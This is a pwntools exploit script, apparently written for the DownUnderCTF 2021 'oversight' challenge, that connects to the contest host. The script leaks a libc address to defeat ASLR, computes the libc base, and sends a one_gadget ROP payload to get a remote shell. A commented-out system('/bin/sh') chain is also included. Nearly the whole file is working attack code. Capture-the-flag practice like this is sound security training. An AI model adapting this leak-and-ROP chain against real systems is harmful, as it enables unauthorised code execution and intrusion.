#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn-2021.duc.tf --port 31909 ./oversight
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./oversight_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31909)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *wait+126
b *echo+25
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = exe.libc

io.sendafter("nue\n","\n")

io.sendlineafter(": ",'27')
io.recvuntil(": ")
leak = int(io.recvline()[:-1],16)
print hex(leak)
libc.address = leak - libc.sym['__libc_start_main']-234 +3
print hex(libc.address)
io.sendlineafter("? ",'256')
if args.LOCAL :
    pop_rdi = libc.search(asm("pop rdi ; ret")).next()
else:
    pop_rdi = libc.address + 0x00000000000215bf
bin_sh = libc.search("/bin/sh").next()
system = libc.sym['system']
off = [0x4f3d5,0x4f432,0x10a41c]
one = libc.address + off[0]

# p = p64(pop_rdi+1)*28
# p += p64(pop_rdi)
# p += p64(bin_sh)
# p += p64(pop_rdi+1)
# p += p64(system)

p = p64(one)*32

io.sendline(p)

io.interactive()

